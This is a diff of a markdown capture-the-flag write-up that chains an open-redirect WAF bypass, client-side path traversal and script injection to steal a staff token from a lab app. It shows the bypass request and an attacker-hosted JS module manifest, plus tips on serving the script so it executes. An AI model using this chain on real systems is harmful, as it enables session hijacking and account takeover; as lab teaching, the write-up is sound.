@@ -12,9 +12,8 @@ tags:
 aliases:
   - "/BugForge/FurHire---Open-Redirect-CSPT"
 ---
-- A second FurHire challenge, and a different chain from the [CSPT-to-ATO writeup](/bugforge/furhire-cspt/). This one is modelled on **Grafana CVE-2025-4123** - the "open redirect + client-side path traversal + XSS" bug - and it ends with a twist most people miss.
-- Four primitives stitched together: an open redirect behind a slash-blocking WAF, a client-side path traversal in a plugin loader, a script-injection sink that only executes JS from the right content-type, and a stolen staff token that reveals the flag in a place nobody looks - a **response header**.
-- The last step is the whole lesson. The flag was never in a response body. Two earlier attempts (and another model) stalled for hours hunting `/flag`, `/api/flag`, `/api/admin/flag` - all 404 - because the secret rides an `X-Flag` header on *every* response once your request carries a `role=staff` token.
+- A second FurHire challenge, and a different chain from the [CSPT-to-ATO writeup](/bugforge/furhire-cspt/). This one is modelled on **Grafana CVE-2025-4123** which is the `open redirect + client-side path traversal + XSS` bug  and it ends with a twist most could miss.
+- Four primitives stitched together: an open redirect behind a slash-blocking WAF, a client-side path traversal in a plugin loader, a script-injection sink that only executes JS from the right content-type, and a stolen staff token that reveals the flag in a **response header**.
 
 ## TL;DR
 
@@ -93,7 +92,9 @@ Every property of a client-side path traversal into a script sink:
 | Runs with victim's token     | gated by `if (localStorage.getItem("token"))`               |
 | Auto-fires on load           | `DOMContentLoaded`                                          |
 
-The `/support` endpoint takes a `url` path field. A moderator (a logged-in `staff` user, in a real browser, with their token in `localStorage`) opens that URL. That is our victim. So if we can make the moderator load `/apps?app=<something that loads our JS>`, our JS runs as staff.
+- The `/support` endpoint takes a `url` path field. 
+- A moderator (a logged-in `staff` user, in a real browser, with their token in `localStorage`) opens that URL.. that is our victim. 
+- So if we can make the moderator load `/apps?app=<something that loads our JS>`, our JS runs as **staff**.
 
 The problem: `apps.js` builds `/api/apps/<app>/manifest` on the **app host**. A traversal like `app=../../studio/manifest.json` just resolves to a path *on the same origin*, which 404s. We need a way to make that same-origin fetch end up pulling an **attacker-controlled** manifest. That is what the open redirect is for.
 
@@ -122,7 +123,8 @@ The server blocks values starting with `http://` / `https://`. And a WAF/proxy i
 
 ### The Bypass - Raw `..//`
 
-The WAF only inspects **encoded** slashes. Raw `..` and raw `//` pass straight through. So:
+- The WAF only inspects **encoded** slashes. 
+- Raw `..` and raw `//` pass straight through. So:
 
 ```http
 GET /public/redirect?url=/x/..//example.com/ HTTP/1.1
@@ -180,7 +182,7 @@ We control the manifest and the module. The manifest is trivial JSON:
 { "name": "phantom", "module": "https://cdn.jsdelivr.net/gh/<user>/<repo>@<commit>/module.js" }
 ```
 
-The catch is *where you host the module*. The obvious choice - a raw GitHub gist - **silently fails**:
+The catch is *where you host the module*. The obvious choice... a raw GitHub gist which **silently fails**:
 
 ```
 GET https://gist.githubusercontent.com/<user>/<id>/raw/module.js
@@ -188,7 +190,9 @@ content-type: text/plain; charset=utf-8
 x-content-type-options: nosniff
 ```
 
-`nosniff` + `text/plain` means the browser **refuses to execute** the file as a script. No error in the console you can see from the outside; the `<script>` element just does nothing. The whole chain fires perfectly and produces zero effect.
+- `nosniff` + `text/plain` means the browser **refuses to execute** the file as a script. 
+- No error in the console you can see from the outside; the `<script>` element just does nothing. 
+- The whole chain fires perfectly and produces zero effect.
 
 **jsdelivr** serves the same repo file with the right headers:
 
@@ -198,9 +202,10 @@ content-type: application/javascript; charset=utf-8
 access-control-allow-origin: *
 ```
 
-`application/javascript` executes; `ACAO: *` keeps cross-origin loading happy. Commit-pin the URL (`@<sha>`) so jsdelivr's cache doesn't serve a stale copy while you iterate.
+- `application/javascript` executes; `ACAO: *` keeps cross-origin loading happy. 
+- Commit-pin the URL (`@<sha>`) so jsdelivr's cache doesn't serve a stale copy while you iterate.
 
-> This one bit hard. A `<script src=raw-gist>` that no-ops with no error looks identical to "my traversal didn't resolve." When the chain *should* fire but nothing happens, check the script host's `content-type` before re-debugging the traversal.
+- When the chain *should* fire but nothing happens, check the script host's `content-type` before re-debugging the traversal.
 
 ## Primitive 4 - Exfil via the App's Own Register Endpoint
 
@@ -259,7 +264,8 @@ GET /api/staff/flag       -> 404
 GET /api/admin/users      -> 404
 ```
 
-Every path 404s, even with the staff token. Hours evaporate here. The flag is not at any path - it is in an `X-Flag` response header present on **every** response (including those 404s) the instant the request carries a `role=staff` token:
+- Every path 404s, even with the staff token.
+- The flag is not at any path - it is in an `X-Flag` response header present on **every** response (including those 404s) the instant the request carries a `role=staff` token:
 
 ```http
 GET /api/verify-token HTTP/1.1
@@ -274,9 +280,7 @@ X-Powered-By: Express
 {"user":{"id":6,"username":"moderation_review","role":"staff", ...}}
 ```
 
-There it is. Any authenticated staff request would have shown it - even the 404s did, we just never read the headers.
-
-> **The core lesson of the whole challenge:** after you steal or forge a privileged token, *replay it and diff the response HEADERS* before hunting for the "right" body path. A privilege-gated secret often rides a header on every response. Tooling makes this easy to miss - Caido's `caido_send_request` default fingerprint hides response headers (status + title + word-count only), so you have to explicitly inspect the full header set. A blanket "authed vs unauthed header diff" on one benign endpoint is a cheap, high-signal first move the moment you hold any elevated credential.
+> **The core lesson of the whole challenge:** after you steal or forge a privileged token, *replay it and diff the response HEADERS* before hunting for the "right" body path. A privilege-gated secret often rides a header on every response. Tooling makes this easy to miss - Caido's `caido_send_request` default fingerprint hides response headers (status + title + word-count only), so you have to explicitly inspect the full header set. (This brought updates to my Caido MCP!) A blanket "authed vs unauthed header diff" on one benign endpoint is a cheap, high-signal first move the moment you hold any elevated credential.
 
 ## Step-by-Step Walkthrough
 
